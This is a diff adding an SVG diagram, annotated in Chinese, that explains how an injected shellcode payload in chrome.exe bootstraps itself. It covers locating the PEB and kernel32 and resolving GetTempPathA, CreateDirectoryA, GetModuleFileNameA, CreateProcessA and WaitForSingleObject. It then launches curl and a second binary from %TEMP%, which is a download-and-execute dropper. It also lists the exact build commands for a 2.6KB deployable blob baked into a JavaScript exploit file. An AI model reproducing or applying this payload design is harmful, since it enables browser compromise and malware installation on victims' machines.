@@ -1,0 +1,80 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="960" height="520" viewBox="0 0 960 520" font-family="'Segoe UI','Microsoft YaHei',sans-serif">
+  <defs>
+    <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#455a64"/>
+    </marker>
+  </defs>
+  <rect width="960" height="520" fill="#fafafa"/>
+  <text x="480" y="30" text-anchor="middle" font-size="19" font-weight="bold" fill="#263238">payload 自举：从 gs:0x60 到 5 个函数指针（零常量、零遍历、重启免疫）</text>
+
+  <!-- step chain -->
+  <rect x="30" y="60" width="160" height="78" rx="6" fill="#e3f2fd" stroke="#1565c0"/>
+  <text x="110" y="84" text-anchor="middle" font-size="12" font-weight="bold" fill="#0d47a1">① 取 PEB</text>
+  <text x="110" y="104" text-anchor="middle" font-size="11" fill="#1565c0" font-family="Consolas,monospace">mov rax, gs:[0x60]</text>
+  <text x="110" y="122" text-anchor="middle" font-size="10" fill="#1565c0">进程块自带，无需搜索</text>
+
+  <rect x="215" y="60" width="170" height="78" rx="6" fill="#e3f2fd" stroke="#1565c0"/>
+  <text x="300" y="84" text-anchor="middle" font-size="12" font-weight="bold" fill="#0d47a1">② chrome.exe 基址</text>
+  <text x="300" y="104" text-anchor="middle" font-size="11" fill="#1565c0" font-family="Consolas,monospace">base = [peb+0x10]</text>
+  <text x="300" y="122" text-anchor="middle" font-size="10" fill="#1565c0">ImageBase（加载器写好）</text>
+
+  <rect x="410" y="60" width="190" height="78" rx="6" fill="#e8eaf6" stroke="#3949ab"/>
+  <text x="505" y="84" text-anchor="middle" font-size="12" font-weight="bold" fill="#1a237e">③ IAT 槽现成地址</text>
+  <text x="505" y="104" text-anchor="middle" font-size="11" fill="#283593" font-family="Consolas,monospace">llw = [base+0x3BE4B8]</text>
+  <text x="505" y="122" text-anchor="middle" font-size="10" fill="#283593">= kernel32!LoadLibraryW</text>
+
+  <rect x="625" y="60" width="150" height="78" rx="6" fill="#fff3e0" stroke="#e65100"/>
+  <text x="700" y="84" text-anchor="middle" font-size="12" font-weight="bold" fill="#bf360c">④ 下扫 MZ+PE</text>
+  <text x="700" y="104" text-anchor="middle" font-size="11" fill="#e65100" font-family="Consolas,monospace">k32 = llw &amp; ~0xFFF</text>
+  <text x="700" y="122" text-anchor="middle" font-size="10" fill="#e65100">逐页向下找 5A4D+4550</text>
+
+  <rect x="800" y="60" width="140" height="78" rx="6" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="870" y="84" text-anchor="middle" font-size="12" font-weight="bold" fill="#1b5e20">⑤ 解析导出表</text>
+  <text x="870" y="104" text-anchor="middle" font-size="11" fill="#2e7d32" font-family="Consolas,monospace">names/ords/funcs</text>
+  <text x="870" y="122" text-anchor="middle" font-size="10" fill="#2e7d32">按名精确匹配（逐字节）</text>
+
+  <line x1="190" y1="99" x2="213" y2="99" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+  <line x1="385" y1="99" x2="408" y2="99" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+  <line x1="600" y1="99" x2="623" y2="99" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+  <line x1="775" y1="99" x2="798" y2="99" stroke="#455a64" stroke-width="1.5" marker-end="url(#ar)"/>
+
+  <!-- resolved exports -->
+  <rect x="30" y="165" width="600" height="140" rx="8" fill="white" stroke="#546e7a" stroke-width="1.5"/>
+  <text x="330" y="190" text-anchor="middle" font-size="13" font-weight="bold" fill="#263238">解析出的 5 个导出（本机 expchk.c 实测：全部 REAL，无 kernelbase 转发器）</text>
+  <g font-family="Consolas,monospace" font-size="12" fill="#37474f">
+    <text x="60" y="218">GetTempPathA        rva=00025170  REAL   → %TEMP%</text>
+    <text x="60" y="240">CreateDirectoryA    rva=00024e60  REAL   → msdb</text>
+    <text x="60" y="262">GetModuleFileNameA  rva=0001f4e0  REAL   → chrome 自身路径</text>
+    <text x="60" y="284">CreateProcessA      rva=0001caa0  REAL   → curl / ms64 两次</text>
+    <text x="60" y="306" fill="#b71c1c">WaitForSingleObject rva=00024e10  REAL   → 等 curl 退出</text>
+  </g>
+
+  <!-- forwarder warning -->
+  <rect x="660" y="165" width="280" height="140" rx="8" fill="#ffebee" stroke="#b71c1c"/>
+  <text x="800" y="190" text-anchor="middle" font-size="12.5" font-weight="bold" fill="#b71c1c">为什么必须查转发器</text>
+  <text x="800" y="212" text-anchor="middle" font-size="10.5" fill="#b71c1c">kernel32 部分导出是指向 kernelbase</text>
+  <text x="800" y="228" text-anchor="middle" font-size="10.5" fill="#b71c1c">的 FORWARDER（RVA 落在导出目录内，</text>
+  <text x="800" y="244" text-anchor="middle" font-size="10.5" fill="#b71c1c">内容是 "kernelbase.Xxx" 字符串）</text>
+  <text x="800" y="266" text-anchor="middle" font-size="10.5" fill="#b71c1c">若按名取到转发器并调用 → 跳进字符串</text>
+  <text x="800" y="282" text-anchor="middle" font-size="10.5" fill="#b71c1c">区当指令执行 = 立即崩溃</text>
+  <text x="800" y="298" text-anchor="middle" font-size="10" fill="#8b0000">expchk.c 逐个验证后才进 g_names 表</text>
+
+  <!-- build pipeline -->
+  <rect x="30" y="330" width="910" height="170" rx="8" fill="#eceff1" stroke="#78909c"/>
+  <text x="480" y="356" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#37474f">从 C 源到 2.6KB 可部署 blob 的构建流水线（三个致命细节）</text>
+  <g font-size="11.5" fill="#37474f">
+    <text x="55" y="382" font-family="Consolas,monospace">clang -Oz -ffreestanding -fno-stack-protector -c payload_src_w4.c</text>
+    <text x="55" y="404" font-family="Consolas,monospace">llvm-objdump -d | grep -c "e8 00 00 00 00"     # 必须 = 0（占位 call 检查）</text>
+    <text x="55" y="426" font-family="Consolas,monospace">llvm-readobj --sections → PointerToRawData=0xDC, RawDataSize=0xA39</text>
+    <text x="55" y="448" font-family="Consolas,monospace">dd if=payload_w4.o of=payload_w4.bin bs=1 skip=220 count=2617</text>
+    <text x="55" y="470" font-family="Consolas,monospace">llvm-nm → payload_main=0x9E, g_origin=0x950  →  烘焙进 payload_embed_w4.js</text>
+  </g>
+  <g font-size="11" fill="#b71c1c">
+    <text x="620" y="382">✗ 坑A：跨函数 call 的 rel32 是占位 0</text>
+    <text x="620" y="400">    → 辅助函数必须 always_inline</text>
+    <text x="620" y="422">✗ 坑B：objcopy -O binary 会塞 60 字节</text>
+    <text x="620" y="440">    COFF 节表头 → 偏移整体漂移，必须 dd 精抽</text>
+    <text x="620" y="462">✗ 坑C：.rodata 字面量部署即丢失</text>
+    <text x="620" y="480">    → 全部字符串 section(".text") 显式放置</text>
+  </g>
+</svg>
